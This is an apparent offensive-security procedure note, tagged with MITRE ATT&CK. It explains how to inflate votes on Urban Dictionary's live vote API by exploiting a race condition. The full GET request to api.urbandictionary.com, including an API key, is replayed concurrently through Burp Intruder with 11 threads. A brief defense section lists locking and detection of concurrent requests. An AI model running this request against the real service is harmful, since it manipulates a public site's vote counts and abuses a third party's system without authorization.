---
tags:
  - race-condition
  - web
  - concurrency-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/urbandictionary-vote-get]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:22.726Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 2f504063-811c-436b-adbd-d9fa9b0a011f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Replay-Vote-Request-Concurrently-with-Burp-Intruder

## Summary

This procedure replays the intercepted vote request multiple times in parallel using Burp Intruder's threading to exploit the race condition and register multiple votes.

## Description

By sending concurrent identical requests, the backend's lack of atomic operations allows all votes to process without enforcement of per-user limits. Target is the /v0/vote endpoint on api.urbandictionary.com. Prerequisites: Intercepted request ready in Burp. Expected: Multiple votes accepted, inflating counts.

## Requirements

1. Burp Suite with intercepted request
2. Configuration for multi-threading (e.g., 11 threads)
3. Stable network to API

## Defense

Defensive measures and detection strategies:

- Implement atomic database operations (e.g., transactions with locking)
- Use Redis or similar for distributed locks on vote keys
- Detect and block concurrent requests from same session

## Objectives

1. Send parallel vote requests to bypass limits
2. Simulate multi-vote attack
3. Confirm race condition exploitation

## Instructions

### Step 1: Send to Intruder

**Context**: Load the intercepted request into Burp Intruder.

No command; right-click request in Proxy > Send to Intruder.

> Clear any payload positions as no modifications needed.

### Step 2: Configure Threads and Attack

**Context**: Set up for concurrent execution.

Use [[commands/urbandictionary-vote-get]] in Intruder with 11 threads:

```http
GET /v0/vote?defid=3889203&direction=up&key=ab71d33b15d36506acf1e379b0ed07ee HTTP/1.1
Host: api.urbandictionary.com
Cache-Control: max-age=0
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://www.urbandictionary.com/
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Referer: http://www.urbandictionary.com/define.php?term=alicia
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8
Connection: close
```

> Start attack; threads send requests simultaneously. Expected: All return 200 OK.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/urbandictionary-vote-get]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- race-condition
- web
- concurrency-exploit
